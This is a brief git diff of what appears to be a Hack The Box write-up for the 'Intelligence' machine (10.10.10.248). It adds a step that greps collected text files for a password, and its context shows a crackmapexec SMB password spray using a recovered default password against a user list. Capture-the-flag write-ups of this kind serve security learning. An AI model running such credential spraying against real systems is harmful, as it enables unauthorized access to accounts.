@@ -83,6 +83,12 @@ NewIntelligenceCorpUser9876
 ![image](https://github.com/regarmulia/HTB/assets/33616880/1274008a-d8b3-475d-acb1-af86b0b1f8b4)
 
 ```
+cat *txt > all.txt
+nano all.txt; ctrl+w password
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/20edb4ef-02e1-4a33-9a2f-9386d399c602)
+
+```
 crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/af9cb0b4-8e06-42ea-96e3-366f913af48a)
